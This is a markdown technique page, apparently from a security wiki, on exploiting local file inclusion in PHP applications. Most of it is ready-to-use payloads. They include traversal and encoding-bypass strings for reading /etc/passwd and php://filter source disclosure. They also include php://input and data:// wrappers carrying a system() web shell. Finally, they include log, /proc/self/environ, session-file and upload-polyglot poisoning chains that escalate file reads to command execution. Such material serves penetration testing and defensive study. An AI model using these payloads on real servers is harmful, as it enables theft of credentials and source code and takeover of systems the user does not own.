---
title: "Local file inclusion: reads, wrappers, and poisoning to RCE"
description: "LFI through traversal and PHP wrappers for source disclosure, plus log, environ, session, and upload poisoning chains that escalate a file read into code execution."
keywords:
  - local file inclusion
  - LFI
  - path traversal
  - php filter wrapper
  - log poisoning
  - proc self environ
---

# Local

Local file inclusion occurs when an include/require sink loads a path the attacker controls, pointing it at files already present on the server. The baseline primitive is arbitrary file read; several chains promote it to code execution.

## Traversal to read files

Against `include($_GET['page'])`, climb out of the expected directory to reach any readable file:

```
?page=../../../../etc/passwd
```

When the code appends an extension, for example `include($_GET['page'].'.php')`, defeat it where the stack allows. Path truncation and a null byte are the classic answers on legacy PHP:

```
?page=../../../../etc/passwd%00
?page=....//....//etc/passwd
```

URL- and double-encode the separators if a filter strips literal `../`:

```
?page=..%2f..%2f..%2fetc%2fpasswd
?page=%252e%252e%252fetc%252fpasswd
```

## PHP wrappers

PHP stream wrappers turn an include sink into far more than a file read.

**Source disclosure with `php://filter`.** Base64-encode a PHP file so the include returns its source instead of executing it:

```
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode the returned blob to read credentials and logic. Chained filters can also be abused to generate arbitrary content for execution.

**Code execution with `php://input`.** When `allow_url_include` is on, feed PHP in the POST body:

```
POST /?page=php://input HTTP/1.1

<?php system($_GET['c']); ?>
```

**Code execution with `data://`.** Inline the payload, optionally base64:

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

## Log poisoning to RCE

If you can read a log and control bytes written into it, inject PHP into the log then include it. Poison the access or error log through a controllable field such as `User-Agent`:

```
GET / HTTP/1.1
User-Agent: <?php system($_GET['c']); ?>
```

Then include the log so the interpreter runs the planted code:

```
?page=/var/log/apache2/access.log&c=id
?page=/var/log/nginx/access.log&c=id
```

Mail logs (`/var/log/mail.log` via a crafted `RCPT TO`), SSH auth logs (a malformed username), and FTP logs work the same way.

## /proc/self/environ

Where it is readable, the process environment echoes request-controlled values. Inject PHP into `User-Agent` and include the environ file:

```
?page=/proc/self/environ&c=id
```

The server-side process writes your `User-Agent` into its environment block, and the include executes it.

## Session file inclusion

If session values store attacker input, plant PHP in a session variable, then include the session file:

```
?page=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
```

Recover `PHPSESSID` from your own cookie; the path varies by distribution (`/tmp/sess_*`, `/var/lib/php5/`).

## Upload plus include chain

When uploads are allowed but land outside the web root or with a non-executable extension, inclusion bridges the gap. Upload a GIF-prefixed polyglot, then include it so the engine runs the embedded PHP regardless of extension:

```
?page=../../uploads/avatar.gif&c=id
```

The inclusion sink executes any PHP in the referenced file, so storage without a `.php` extension no longer protects the server.

## References

- [OWASP: Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/)
- [PayloadsAllTheThings: File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
